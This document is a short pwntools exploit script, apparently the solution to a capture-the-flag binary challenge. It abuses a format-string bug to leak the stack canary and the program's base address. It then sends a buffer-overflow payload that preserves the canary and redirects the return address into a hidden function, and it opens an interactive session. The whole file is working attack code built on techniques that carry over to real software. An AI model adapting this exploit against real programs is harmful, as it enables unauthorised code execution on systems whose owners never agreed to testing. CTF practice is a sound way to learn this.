from pwn import *

context.binary = elf = ELF("./challenge/chal")

p = elf.process()
assert p

p.recvlines(2)


p.sendlineafter(b'name', b'%11$p')

canary = int(p.recvline().strip().decode().split(' ')[2][:-1], 16)

log.info(f"canary = {hex(canary)}")

p.sendlineafter(b'name', b'%13$p')

elf.address = int(p.recvline().strip().decode().split(' ')[2][:-1], 16) - 0x1385

log.info(f"ELF @ {hex(elf.address)}")


p.sendlineafter(b'name', b'exit' + b'A'*36 + p64(canary) + p64(0) + p64(elf.symbols['VerY_s3cREt_fUnCti0N']+175) + p64(elf.symbols['VerY_s3cREt_fUnCti0N']))


p.interactive()
